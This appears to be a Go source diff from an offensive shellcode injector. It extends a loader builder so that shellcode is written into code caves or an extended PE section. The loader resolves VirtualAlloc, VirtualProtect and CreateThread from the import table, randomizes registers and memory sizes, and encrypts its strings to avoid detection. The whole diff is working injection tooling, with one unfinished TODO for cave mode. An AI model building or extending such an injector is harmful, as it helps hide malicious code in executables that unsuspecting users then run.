@@ -15,6 +15,12 @@ import (
 	"github.com/For-ACGN/go-keystone"
 )
 
+// mov eax, 0x11223344     mov rax, 0x1122334455667788
+// xor eax, ebx            xor rax, rbx
+// mov [edi], eax          mov [rdi], rax
+// add edi, 4              add rdi, 8
+const numInstForCopyShellcode = 4
+
 // just for prevent [import _ "embed"] :)
 var _ embed.FS
 
@@ -91,9 +97,15 @@ type loaderCtx struct {
 	VirtualAlloc   uint64
 	VirtualProtect uint64
 	CreateThread   uint64
+
+	// information of write shellcode
+	SectionMode   bool
+	SectionOffset uint32
+	MemRegionSize int
+	ShellcodeSize int
 }
 
-func (inj *Injector) buildLoader() ([]byte, error) {
+func (inj *Injector) buildLoader(shellcode []byte) ([]byte, error) {
 	// initialize keystone engine
 	err := inj.initAssembler()
 	if err != nil {
@@ -103,7 +115,7 @@ func (inj *Injector) buildLoader() ([]byte, error) {
 		_ = inj.engine.Close()
 		inj.engine = nil
 	}()
-	// create assembly source
+	// parse loader source template
 	var src string
 	switch inj.arch {
 	case "386":
@@ -117,18 +129,27 @@ func (inj *Injector) buildLoader() ([]byte, error) {
 		"dr":  toRegDWORD,
 	}).Parse(src)
 	if err != nil {
-		return nil, fmt.Errorf("invalid assembly source template: %s", err)
+		return nil, fmt.Errorf("invalid loader template: %s", err)
 	}
+	// prepare loader context for build source
+	memRegionSize := (len(shellcode)/4096 + 1 + inj.rand.Intn(16)) * 4096
 	ctx := &loaderCtx{
 		Reg:  inj.buildRandomRegisterMap(),
 		RegV: inj.buildVolatileRegisterMap(),
 		RegN: inj.buildNonvolatileRegisterMap(),
+
+		MemRegionSize: memRegionSize,
+		ShellcodeSize: len(shellcode),
 	}
 	err = inj.findProcFromIAT(ctx)
 	if err != nil {
 		return nil, err
 	}
 	inj.encryptStrings(ctx)
+	err = inj.selectMode(ctx, shellcode)
+	if err != nil {
+		return nil, err
+	}
 	// process loader template and assemble it
 	buf := bytes.NewBuffer(make([]byte, 0, 512))
 	err = tpl.Execute(buf, ctx)
@@ -364,6 +385,27 @@ func (inj *Injector) encryptString(str string, isUTF16 bool) ([]int64, []int64) 
 		}
 	}
 	return val, key
+}
+
+func (inj *Injector) selectMode(ctx *loaderCtx, shellcode []byte) error {
+	// check need extend section
+	var numCaves int
+	switch inj.arch {
+	case "386":
+		numCaves = (len(shellcode)/4 + 1) * numInstForCopyShellcode
+	case "amd64":
+		numCaves = (len(shellcode)/8 + 1) * numInstForCopyShellcode
+	}
+	if minNumCaves+numCaves < len(inj.caves) {
+		// TODO finish cove cave mode
+		// ctx.SectionMode
+	}
+	if inj.opts.DisableExtendSection {
+		return errors.New("shellcode is too large and extend section is disabled")
+	}
+	ctx.SectionMode = true
+	ctx.SectionOffset = inj.extendSection(shellcode)
+	return nil
 }
 
 func toUTF16(s string) string {
